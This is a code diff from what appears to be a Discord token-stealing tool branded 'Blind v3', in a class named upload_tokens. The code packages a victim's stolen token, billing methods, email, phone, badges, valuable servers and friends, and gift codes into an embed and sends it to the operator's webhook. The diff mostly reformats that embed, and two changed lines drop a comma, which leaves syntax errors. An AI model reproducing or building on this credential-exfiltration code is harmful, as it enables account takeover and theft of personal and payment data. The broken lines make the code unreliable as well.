@@ -339,29 +339,27 @@ class upload_tokens:
             else:
                 codes = None
 
-            embed = Embed(title=f"{username} ({user_id})", color=0x000000)
+            embed = Embed(title=f"{username}", color=0x000000)
             embed.set_thumbnail(url=avatar)
 
-            embed.add_field(name="🔑 Token [Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", value=f"```{token}```", inline=False)
+            embed.add_field(name="🔑 Token", value=f"```{token}```", inline=False)
             embed.add_field(name="Nitro", value=f"```{nitro}```", inline=True)
-            embed.add_field(name="Badges", value=f"```{badges if badges != '' else 'None'}```", inline=True)
-            embed.add_field(name="Billing", value=f"```{payment_methods if payment_methods != '' else 'None'}```", inline=True)
+            embed.add_field(name="Badges", value=f"```{badges if badges != '' else 'None'}```" inline=True)
+            embed.add_field(name="Billing", value=f"```{payment_methods if payment_methods != '' else 'None'}```" inline=True)
 
             embed.add_field(name="Email", value=f"```{email if email != None else 'None'}```", inline=True)
             embed.add_field(name="Phone", value=f"```{phone if phone != None else 'None'}```", inline=True)    
 
 
             if hq_guilds != None:
-                embed.add_field(name="HQ Guilds:", value=hq_guilds, inline=False)
+                embed.add_field(name="HQ Guilds", value=hq_guilds, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
-           
             if hq_friends != None:
-                embed.add_field(name="HQ Friends:", value=hq_friends, inline=False)
+                embed.add_field(name="HQ Friends", value=hq_friends, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
             if codes != None:
-                embed.add_field(name="🎁 Gift Codes:", value=codes, inline=False)
+                embed.add_field(name="🎁 Gift Codes", value=codes, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
-
             embed.set_footer(text="Created by: readdone#9772")
 
             self.webhook.send(embed=embed, username="Blind v3", avatar_url="https://i.imgur.com/LNVOaxg.png")
